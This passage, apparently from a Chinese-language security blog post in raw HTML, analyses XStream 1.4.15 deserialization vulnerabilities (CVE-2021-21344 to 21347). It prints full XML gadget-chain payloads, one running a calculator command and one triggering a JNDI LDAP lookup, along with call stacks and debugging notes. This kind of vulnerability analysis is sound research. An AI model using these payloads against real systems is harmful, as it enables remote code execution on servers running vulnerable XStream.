class="name">int</span>&gt;</span>-1<span class="tag">&lt;/<span class="name">int</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">int</span>&gt;</span>-1<span class="tag">&lt;/<span class="name">int</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">int</span>&gt;</span>-1<span class="tag">&lt;/<span class="name">int</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">int</span>&gt;</span>-1<span class="tag">&lt;/<span class="name">int</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">int</span>&gt;</span>-1<span class="tag">&lt;/<span class="name">int</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">int</span>&gt;</span>-1<span class="tag">&lt;/<span class="name">int</span>&gt;</span></span><br><span class="line">                      <span class="tag">&lt;/<span class="name">iMatchColumns</span>&gt;</span></span><br><span class="line">                      <span class="tag">&lt;<span class="name">strMatchColumns</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">string</span>&gt;</span>foo<span class="tag">&lt;/<span class="name">string</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">null</span>/&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">null</span>/&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">null</span>/&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">null</span>/&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">null</span>/&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">null</span>/&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">null</span>/&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">null</span>/&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">null</span>/&gt;</span></span><br><span class="line">                      <span class="tag">&lt;/<span class="name">strMatchColumns</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;/<span class="name">default</span>&gt;</span></span><br><span class="line">                  <span class="tag">&lt;/<span class="name">com.sun.rowset.JdbcRowSetImpl</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;/<span class="name">jaxbObject</span>&gt;</span></span><br><span class="line">              <span class="tag">&lt;/<span class="name">dataSource</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">message</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">satellites</span>/&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">invocationProperties</span>/&gt;</span></span><br><span class="line">          <span class="tag">&lt;/<span class="name">packet</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">indexMap</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;/<span class="name">comparator</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">default</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">int</span>&gt;</span>3<span class="tag">&lt;/<span class="name">int</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">string</span>&gt;</span>javax.xml.ws.binding.attachments.inbound<span class="tag">&lt;/<span class="name">string</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">string</span>&gt;</span>javax.xml.ws.binding.attachments.inbound<span class="tag">&lt;/<span class="name">string</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">java.util.PriorityQueue</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">java.util.PriorityQueue</span>&gt;</span></span><br></pre></td></tr></table></figure><p>调试：</p><p>不难看出这次反序列化的入口点是<code>PriorityQueue</code>，它也是cc链中高频出现的节点。</p><p>在之前分析过程中我们也知道，对于实现了<code>Serializable</code>接口的类对象，在反序列化过程中会调用重写的<code>readObject</code>方法</p><p>我们可以在<code>readObject</code>方法处打断点：</p><img src="../images/XStream%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E6%A2%B3%E7%90%86/image-20210803220000591.png" alt="image-20210803220000591" style="zoom:50%;"><p>进入<code>heapify()</code>方法：</p><img src="../images/XStream%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E6%A2%B3%E7%90%86/image-20210803220110388.png" alt="image-20210803220110388" style="zoom:50%;"><img src="../images/XStream%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E6%A2%B3%E7%90%86/image-20210803220130104.png" alt="image-20210803220130104" style="zoom:50%;"><img src="../images/XStream%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E6%A2%B3%E7%90%86/image-20210803220200383.png" alt="image-20210803220200383" style="zoom:50%;"><p>一路下来，在这里调用了PriorityQueue类中存储在comparator属性中的对象的compare方法，也就是PoC中的<code>sun.awt.datatransfer.DataTransferer$IndexOrderComparator</code>类对象，也就是说接下来会去调用这个类的<code>compare</code>方法</p><p>接下来会调用一系列的函数，太长了，贴一下调用栈：</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">java.util.PriorityQueue#heapify</span><br><span class="line">  sun.awt.datatransfer.DataTransferer$IndexOrderComparator#compare</span><br><span class="line">    com.sun.xml.internal.ws.client.ResponseContext#get</span><br><span class="line">      com.sun.xml.internal.ws.api.message.MessageWrapper#getAttachments</span><br><span class="line">        com.sun.xml.internal.ws.encoding.xml.XMLMessage$XMLMultiPart#getAttachments</span><br><span class="line">          com.sun.xml.internal.ws.encoding.xml.XMLMessage$XMLMultiPart#getMessage</span><br><span class="line">            com.sun.xml.internal.ws.message.JAXBAttachment#getInputStream</span><br><span class="line">              com.sun.xml.internal.ws.message.JAXBAttachment#asInputStream</span><br><span class="line">                com.sun.xml.internal.ws.message.JAXBAttachment#writeTo</span><br><span class="line">                  com.sun.xml.internal.ws.db.glassfish.BridgeWrapper#marshal</span><br><span class="line">                    com.sun.xml.internal.bind.api.Bridge#marshal</span><br><span class="line">                      com.sun.xml.internal.bind.v2.runtime.BridgeImpl#marshal</span><br><span class="line">                        com.sun.xml.internal.bind.v2.runtime.MarshallerImpl#write</span><br><span class="line">                          com.sun.xml.internal.bind.v2.runtime.XMLSerializer#childAsXsiType</span><br><span class="line">                            com.sun.xml.internal.bind.v2.runtime.ClassBeanInfoImpl#serializeURIs</span><br><span class="line">                              com.sun.xml.internal.bind.v2.runtime.reflect.Accessor$GetterSetterReflection#get</span><br><span class="line">                                com.sun.rowset.JdbcRowSetImpl#getDatabaseMetaData</span><br><span class="line">                                  com.sun.rowset.JdbcRowSetImpl#connect</span><br></pre></td></tr></table></figure><p>关键点在<code>com.sun.xml.internal.bind.v2.runtime.reflect.Accessor$GetterSetterReflection#get</code></p><img src="../images/XStream%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E6%A2%B3%E7%90%86/image-20210804182242246.png" alt="image-20210804182242246" style="zoom:50%;"><p>这里存在invoke函数，导致整个链可以连通。</p><img src="../images/XStream%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E6%A2%B3%E7%90%86/image-20210804183142196.png" alt="image-20210804183142196" style="zoom:50%;"><p>可以看到invoke到<code>com.sun.rowset.JdbcRowSetImpl#getDatabaseMetaData</code>中，并最终在JdbcRowSetImpl的connect方法中通过JNDI去lookup事先封装在JdbcRowSetImpl的dataSource中的恶意地址：</p><img src="../images/XStream%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E6%A2%B3%E7%90%86/image-20210804183420058.png" alt="image-20210804183420058" style="zoom:50%;"><p>其实整个链的关键点是这里的get方法：</p><img src="../images/XStream%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E6%A2%B3%E7%90%86/image-20210804182242246.png" alt="image-20210804182242246" style="zoom:50%;"><p>XStream不受Serializable接口限制，所有类都可以实例化，导致链过程中的很多节点都可以参与序列化。</p><h1 id="CVE-2021-21345"><a href="#CVE-2021-21345" class="headerlink" title="CVE_2021_21345"></a>CVE_2021_21345</h1><p>XStream：1.4.15</p><h2 id="漏洞成因-4"><a href="#漏洞成因-4" class="headerlink" title="漏洞成因"></a>漏洞成因</h2><p>和21344长得很像，出发点是一样的PriorityQueue，RCE触发点是com.sun.corba.se.impl.activation.ServerTableEntry</p><p>唯一的不同点在于：</p><p>21344使用JdbcRowSetImpl去远程加载恶意类来到本地执行恶意代码；</p><p>21345使用<code>com.sun.corba.se.impl.activation.ServerTableEntry</code>类直接在本地执行恶意代码</p><h2 id="PoC-4"><a href="#PoC-4" class="headerlink" title="PoC"></a>PoC</h2><p>来自官网：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">java.util.PriorityQueue</span> <span class="attr">serialization</span>=<span class="string">'custom'</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">unserializable-parents</span>/&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">java.util.PriorityQueue</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">default</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">size</span>&gt;</span>2<span class="tag">&lt;/<span class="name">size</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">comparator</span> <span class="attr">class</span>=<span class="string">'sun.awt.datatransfer.DataTransferer$IndexOrderComparator'</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">indexMap</span> <span class="attr">class</span>=<span class="string">'com.sun.xml.internal.ws.client.ResponseContext'</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">packet</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">message</span> <span class="attr">class</span>=<span class="string">'com.sun.xml.internal.ws.encoding.xml.XMLMessage$XMLMultiPart'</span>&gt;</span></span><br><span class="line">              <span class="tag">&lt;<span class="name">dataSource</span> <span class="attr">class</span>=<span class="string">'com.sun.xml.internal.ws.message.JAXBAttachment'</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">bridge</span> <span class="attr">class</span>=<span class="string">'com.sun.xml.internal.ws.db.glassfish.BridgeWrapper'</span>&gt;</span></span><br><span class="line">                  <span class="tag">&lt;<span class="name">bridge</span> <span class="attr">class</span>=<span class="string">'com.sun.xml.internal.bind.v2.runtime.BridgeImpl'</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">bi</span> <span class="attr">class</span>=<span class="string">'com.sun.xml.internal.bind.v2.runtime.ClassBeanInfoImpl'</span>&gt;</span></span><br><span class="line">                      <span class="tag">&lt;<span class="name">jaxbType</span>&gt;</span>com.sun.corba.se.impl.activation.ServerTableEntry<span class="tag">&lt;/<span class="name">jaxbType</span>&gt;</span></span><br><span class="line">                      <span class="tag">&lt;<span class="name">uriProperties</span>/&gt;</span></span><br><span class="line">                      <span class="tag">&lt;<span class="name">attributeProperties</span>/&gt;</span></span><br><span class="line">                      <span class="tag">&lt;<span class="name">inheritedAttWildcard</span> <span class="attr">class</span>=<span class="string">'com.sun.xml.internal.bind.v2.runtime.reflect.Accessor$GetterSetterReflection'</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">getter</span>&gt;</span></span><br><span class="line">                          <span class="tag">&lt;<span class="name">class</span>&gt;</span>com.sun.corba.se.impl.activation.ServerTableEntry<span class="tag">&lt;/<span class="name">class</span>&gt;</span></span><br><span class="line">                          <span class="tag">&lt;<span class="name">name</span>&gt;</span>verify<span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line">                          <span class="tag">&lt;<span class="name">parameter-types</span>/&gt;</span></span><br><span class="line">                        <span class="tag">&lt;/<span class="name">getter</span>&gt;</span></span><br><span class="line">                      <span class="tag">&lt;/<span class="name">inheritedAttWildcard</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;/<span class="name">bi</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">tagName</span>/&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">context</span>&gt;</span></span><br><span class="line">                      <span class="tag">&lt;<span class="name">marshallerPool</span> <span class="attr">class</span>=<span class="string">'com.sun.xml.internal.bind.v2.runtime.JAXBContextImpl$1'</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">outer-class</span> <span class="attr">reference</span>=<span class="string">'../..'</span>/&gt;</span></span><br><span class="line">                      <span class="tag">&lt;/<span class="name">marshallerPool</span>&gt;</span></span><br><span class="line">                      <span class="tag">&lt;<span class="name">nameList</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">nsUriCannotBeDefaulted</span>&gt;</span></span><br><span class="line">                          <span class="tag">&lt;<span class="name">boolean</span>&gt;</span>true<span class="tag">&lt;/<span class="name">boolean</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;/<span class="name">nsUriCannotBeDefaulted</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">namespaceURIs</span>&gt;</span></span><br><span class="line">                          <span class="tag">&lt;<span class="name">string</span>&gt;</span>1<span class="tag">&lt;/<span class="name">string</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;/<span class="name">namespaceURIs</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">localNames</span>&gt;</span></span><br><span class="line">                          <span class="tag">&lt;<span class="name">string</span>&gt;</span>UTF-8<span class="tag">&lt;/<span class="name">string</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;/<span class="name">localNames</span>&gt;</span></span><br><span class="line">                      <span class="tag">&lt;/<span class="name">nameList</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;/<span class="name">context</span>&gt;</span></span><br><span class="line">                  <span class="tag">&lt;/<span class="name">bridge</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;/<span class="name">bridge</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">jaxbObject</span> <span class="attr">class</span>=<span class="string">'com.sun.corba.se.impl.activation.ServerTableEntry'</span>&gt;</span></span><br><span class="line">                  <span class="tag">&lt;<span class="name">activationCmd</span>&gt;</span>open /Applications/Calculator.app<span class="tag">&lt;/<span class="name">activationCmd</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;/<span class="name">jaxbObject</span>&gt;</span></span><br><span class="line">              <span class="tag">&lt;/<span class="name">dataSource</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">message</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">satellites</span>/&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">invocationProperties</span>/&gt;</span></span><br><span class="line">          <span class="tag">&lt;/<span class="name">packet</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">indexMap</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;/<span class="name">comparator</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">default</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">int</span>&gt;</span>3<span class="tag">&lt;/<span class="name">int</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">string</span>&gt;</span>javax.xml.ws.binding.attachments.inbound<span class="tag">&lt;/<span class="name">string</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">string</span>&gt;</span>javax.xml.ws.binding.attachments.inbound<span class="tag">&lt;/<span class="name">string</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">java.util.PriorityQueue</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">java.util.PriorityQueue</span>&gt;</span></span><br></pre></td></tr></table></figure><p>调试：</p><p>前半部分还是一样，一样是到了get方法去invoke，invoke的目标方法就是</p><img src="../images/XStream%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E6%A2%B3%E7%90%86/image-20210806193915558.png" alt="image-20210806193915558" style="zoom:50%;"><p>我们直接去<code>com.sun.corba.se.impl.activation.ServerTableEntry</code>的<code>verify</code>方法打上断点好了，跟到verify：</p><img src="../images/XStream%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E6%A2%B3%E7%90%86/image-20210806195221879.png" alt="image-20210806195221879" style="zoom:50%;"><p>直接触发了<code>Runtime.getRuntime().exec(&quot;open /Applications/Calculator.app&quot;);</code></p><h1 id="CVE-2021-21346"><a href="#CVE-2021-21346" class="headerlink" title="CVE_2021_21346"></a>CVE_2021_21346</h1><p>XStream：1.4.15</p><h2 id="漏洞成因-5"><a href="#漏洞成因-5" class="headerlink" title="漏洞成因"></a>漏洞成因</h2><p>师兄wh1t3p1g提交的，利用的是ldap恶意reference</p><h2 id="PoC-5"><a href="#PoC-5" class="headerlink" title="PoC"></a>PoC</h2><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">sorted-set</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">javax.naming.ldap.Rdn_-RdnEntry</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">type</span>&gt;</span>ysomap<span class="tag">&lt;/<span class="name">type</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">value</span> <span class="attr">class</span>=<span class="string">'javax.swing.MultiUIDefaults'</span> <span class="attr">serialization</span>=<span class="string">'custom'</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">unserializable-parents</span>/&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">hashtable</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">default</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">loadFactor</span>&gt;</span>0.75<span class="tag">&lt;/<span class="name">loadFactor</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">threshold</span>&gt;</span>525<span class="tag">&lt;/<span class="name">threshold</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;/<span class="name">default</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">int</span>&gt;</span>700<span class="tag">&lt;/<span class="name">int</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">int</span>&gt;</span>0<span class="tag">&lt;/<span class="name">int</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">hashtable</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">javax.swing.UIDefaults</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">default</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">defaultLocale</span>&gt;</span>zh_CN<span class="tag">&lt;/<span class="name">defaultLocale</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">resourceCache</span>/&gt;</span></span><br><span class="line">                <span class="tag">&lt;/<span class="name">default</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">javax.swing.UIDefaults</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">javax.swing.MultiUIDefaults</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">default</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">tables</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">javax.swing.UIDefaults</span> <span class="attr">serialization</span>=<span class="string">'custom'</span>&gt;</span></span><br><span class="line">                            <span class="tag">&lt;<span class="name">unserializable-parents</span>/&gt;</span></span><br><span class="line">                            <span class="tag">&lt;<span class="name">hashtable</span>&gt;</span></span><br><span class="line">                                <span class="tag">&lt;<span class="name">default</span>&gt;</span></span><br><span class="line">                                    <span class="tag">&lt;<span class="name">loadFactor</span>&gt;</span>0.75<span class="tag">&lt;/<span class="name">loadFactor</span>&gt;</span></span><br><span class="line">                                    <span class="tag">&lt;<span class="name">threshold</span>&gt;</span>525<span class="tag">&lt;/<span class="name">threshold</span>&gt;</span></span><br><span class="line">                                <span class="tag">&lt;/<span class="name">default</span>&gt;</span></span><br><span class="line">                                <span class="tag">&lt;<span class="name">int</span>&gt;</span>700<span class="tag">&lt;/<span class="name">int</span>&gt;</span></span><br><span class="line">                                <span class="tag">&lt;<span class="name">int</span>&gt;</span>1<span class="tag">&lt;/<span class="name">int</span>&gt;</span></span><br><span class="line">                                <span class="tag">&lt;<span class="name">string</span>&gt;</span>lazyValue<span class="tag">&lt;/<span class="name">string</span>&gt;</span></span><br><span class="line">                                <span class="tag">&lt;<span class="name">sun.swing.SwingLazyValue</span>&gt;</span></span><br><span class="line">                                    <span class="tag">&lt;<span class="name">className</span>&gt;</span>javax.naming.InitialContext<span class="tag">&lt;/<span class="name">className</span>&gt;</span></span><br><span class="line">                                    <span class="tag">&lt;<span class="name">methodName</span>&gt;</span>doLookup<span class="tag">&lt;/<span class="name">methodName</span>&gt;</span></span><br><span class="line">                                    <span class="tag">&lt;<span class="name">args</span>&gt;</span></span><br><span class="line">                                        <span class="tag">&lt;<span class="name">string</span>&gt;</span>ldap://localhost:1099/CallRemoteMethod<span class="tag">&lt;/<span class="name">string</span>&gt;</span></span><br><span class="line">                                    <span class="tag">&lt;/<span class="name">args</span>&gt;</span></span><br><span class="line">                                <span class="tag">&lt;/<span class="name">sun.swing.SwingLazyValue</span>&gt;</span></span><br><span class="line">                            <span class="tag">&lt;/<span class="name">hashtable</span>&gt;</span></span><br><span class="line">                            <span class="tag">&lt;<span class="name">javax.swing.UIDefaults</span>&gt;</span></span><br><span class="line">                                <span class="tag">&lt;<span class="name">default</span>&gt;</span></span><br><span class="line">                                    <span class="tag">&lt;<span class="name">defaultLocale</span> <span class="attr">reference</span>=<span class="string">'../../../../../../../javax.swing.UIDefaults/default/defaultLocale'</span>/&gt;</span></span><br><span class="line">                                    <span class="tag">&lt;<span class="name">resourceCache</span>/&gt;</span></span><br><span class="line">                                <span class="tag">&lt;/<span class="name">default</span>&gt;</span></span><br><span class="line">                            <span class="tag">&lt;/<span class="name">javax.swing.UIDefaults</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;/<span class="name">javax.swing.UIDefaults</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;/<span class="name">tables</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;/<span class="name">default</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">javax.swing.MultiUIDefaults</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">javax.naming.ldap.Rdn_-RdnEntry</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">javax.naming.ldap.Rdn_-RdnEntry</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">type</span>&gt;</span>ysomap<span class="tag">&lt;/<span class="name">type</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">value</span> <span class="attr">class</span>=<span class="string">'com.sun.org.apache.xpath.internal.objects.XString'</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">m__obj</span> <span class="attr">class</span>=<span class="string">'string'</span>&gt;</span>test<span class="tag">&lt;/<span class="name">m__obj</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">javax.naming.ldap.Rdn_-RdnEntry</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">sorted-set</span>&gt;</span></span><br></pre></td></tr></table></figure><p>调试：</p><p>利用的是<code>LazyValue</code></p><p>关键调用链：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">javax.naming.ldap.Rdn$RdnEntry.compareTo</span><br><span class="line">    com.sun.org.apache.xpath.internal.objects.XString.equals</span><br><span class="line">        javax.swing.MultiUIDefaults.toString</span><br><span class="line">            UIDefaults.get</span><br><span class="line">                UIDefaults.getFromHashTable</span><br><span class="line">                    UIDefaults$LazyValue.createValue</span><br><span class="line">                    SwingLazyValue.createValue</span><br><span class="line">                        javax.naming.InitialContext.doLookup()</span><br></pre></td></tr></table></figure><p>在<code>createValue</code>里面出现了invoke，也是一个关键的节点，invoke了构造好的<code>javax.naming.InitialContext.doLookup()</code>方法</p><img src="../images/XStream%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E6%A2%B3%E7%90%86/image-20210806200548285.png" alt="image-20210806200548285" style="zoom:50%;"><p><code>doLookUp</code>对恶意类的reference进行了调用，漏洞触发。</p><h1 id="CVE-2021-21347"><a href="#CVE-2021-21347" class="headerlink" title="CVE_2021_21347"></a>CVE_2021_21347</h1><p>XStream：1.4.15 </p><p>jdk: 8u231</p><h2 id="漏洞成因-6"><a href="#漏洞成因-6" class="headerlink" title="漏洞成因"></a>漏洞成因</h2><p>远程类加载，类实例化执行静态代码块</p><h2 id="PoC-6"><a href="#PoC-6" class="headerlink" title="PoC"></a>PoC</h2><p>来自官网：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span 